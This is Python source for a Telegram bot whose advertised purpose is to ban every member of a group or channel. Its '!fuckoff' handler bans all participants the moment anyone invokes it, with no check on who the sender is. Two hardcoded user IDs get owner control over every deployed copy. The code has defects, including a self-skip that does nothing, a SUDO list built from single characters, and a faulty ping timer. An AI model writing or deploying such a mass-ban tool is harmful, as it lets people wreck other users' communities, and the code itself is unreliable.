#Copyright @Darwin_xD ||| 

import logging
import re
import os
import sys
import asyncio
from telethon import TelegramClient, events
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
from telethon import Button
from dotenv import load_dotenv


logging.basicConfig(level=logging.INFO)
load_dotenv()

print("Nitric xD...")

TeamxD = TelegramClient('TeamxD', os.getenv('API_ID'), os.getenv('API_HASH')).start(bot_token=os.getenv('BOT_TOKEN'))

LUCIFER = [5363436020, 5231844682]
for x in os.getenv('SUDO'):
    LUCIFER.append(x)

print("Bᴏᴏᴛɪɴɢ...")

@TeamxD.on(events.NewMessage(pattern="^!ping"))  
async def ping(e):
        start = datetime.now()
        text = "Darwin xD!"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"__Fᴜᴄᴋ Oꜰꜰ Mᴏɪɪ Sᴏɴ__ \n\n __Pᴏɴɢ__ !! `{ms}` ms")

print("Sᴛᴀʀᴛɪɴɢ Pɪɴɢ......")

@TeamxD.on(events.NewMessage(pattern="^!online"))  
async def ping(e):
        start = datetime.now()
        text = "Cʀᴀᴛᴛɪɴɢ..."
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"__Mᴇ Iᴢᴢ Aʟɪᴠᴇ__\n\n __Darwin Xd__ !! `{ms}` ms")

print("Lᴏᴀᴅɪɴɢ BᴀɴAʟʟ...")
@TeamxD.on(events.NewMessage(pattern="^!fuckoff"))
async def testing(event):
   if not event.is_group:
        Reply = f"Pʟᴇᴀsᴇ! Usᴇ ᴛʜɪs ᴄᴍᴅ ɪɴ ɢʀᴏᴜᴘ."
        await event.reply(Reply, parse_mode=None, link_preview=None )
   else:
       await event.delete()
       userchat = await event.get_chat()
       BADNAM = await event.client.get_me()
       admin = userchat.admin_rights
       creator = userchat.creator
       if not admin and not creator:
           await event.reply("Pʟᴇᴀsᴇ ᴄᴏɴғɪʀᴍ ᴍʏ ʀɪɢʜᴛs !!")
           return
       await event.reply("Fᴜᴋɪɴɢ !! Sᴛᴀʀᴛᴇᴅ...Bʏ Darwin xD...")
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == BADNAM.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.0)

print("Lᴏᴀᴅɪɴɢ Lᴇᴀᴠᴇ...")

@TeamxD.on(events.NewMessage(pattern="^!leave"))
async def _(e):
      if e.sender_id in LUCIFER:
        userchat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = userchat[0]
            bc = int(bc)
            text = "Lᴇᴀᴠɪɴɢ..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Sᴜᴄᴄᴇssғᴜʟʟʏ Lᴇғᴛ")
            except Exception as e:
                await event.edit(str(e))   
        else:
            bc = e.chat_id
            text = "Lᴇᴀᴠɪɴɢ....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Fᴜᴄᴋɪɴɢ Sᴛᴏᴘᴘᴇᴅ...Cᴏɴᴛᴀᴄᴛ Darwin xD.")
            except Exception as e:
                await event.edit(str(e))   
          

print("Lᴏᴀᴅɪɴɢ Rᴇsᴛᴀʀᴛ...")

@TeamxD.on(events.NewMessage(pattern="^!restart"))
async def restart(e):
      if e.sender_id in LUCIFER:
        text = "__Rᴇsᴛᴀʀᴛɪɴɢ__ , Tɪᴍᴇ ɪᴢᴢ ᴜᴘ !!"
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await TeamxD.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


#start
@TeamxD.on(events.NewMessage(pattern="^/start$"))
async def start(event):
  await event.reply(
"""────「 [𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐀𝐜𝐭𝐢𝐨𝐧](https://telegra.ph/file/ba38ba16fdf2f6e45fa4c.png) 」────
*Hᴇʏ !!,*
Wᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴛɪᴏɴ ʙᴏᴛ's ᴍᴇɴᴜ. \n I ᴄᴀɴ ʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ɢʀᴏᴜᴘs ᴀɴᴅ ᴄʜᴀɴɴᴇʟs.
➖➖➖➖➖➖➖➖➖➖➖➖➖
‣ Managed By - @Darwin_xD ❥︎
➖➖➖➖➖➖➖➖➖➖➖➖➖
➛ Nᴇᴇᴅ Hᴇʟᴘ /help ××
""",
    buttons=(
                      [
                         Button.url('📣 ᴜᴘᴅᴀᴛᴇs', 'https://t.me/TheXCodeTeam'), 
                         Button.url('sᴜᴘᴘᴏʀᴛ ⭐', 'https://t.me/XCodeSupport'), 
                      ], 
                      [
                        Button.url('➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ', 'https://t.me/Badmoshi_bot?startgroup=true'),   
                      ]
                   ), 
                    link_preview=False
                   )

#help
@TeamxD.on(events.NewMessage(pattern="^/help$"))
async def help(event):
  helptext = "**Telegram Action Bot's Help Menu**\n\n**Commands:**\n\n `!ping` - Check Ping Status Bot.. \n\n `!online` - For Check Bot Alive Or Not. \n\n `!fuckoff` - For Ban All Members In Group.\n\n **Owner Commands:**\n\n `!leave` - For Leave Chat Group From Bot.\n\n `!restart` - For Restart Your Bot."
  await event.reply(helptext,
                    buttons=(
                      [
                         Button.url('📣 ᴜᴘᴅᴀᴛᴇs', 'https://t.me/TheXCodeTeam'), 
                         Button.url('sᴜᴘᴘᴏʀᴛ ⭐', 'https://t.me/XCodeSupport'), 
                      ], 
                      [
                        Button.url('➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ', 'https://t.me/Badmoshi_bot?startgroup=true'),   
                      ]
                   ), 
                    link_preview=False
                   )

print("\n\n")
print("Bᴏᴛ Dᴇᴘʟᴏʏᴍᴇɴᴛ Sᴜᴄᴄᴇss!! Iғ Aɴʏ Pʀᴏʙʟᴇᴍ Fᴀᴄɪɴɢ Tʜᴇɴ Cᴏɴᴛᴀᴄᴛ @Darwin_xD")

TeamxD.run_until_disconnected()
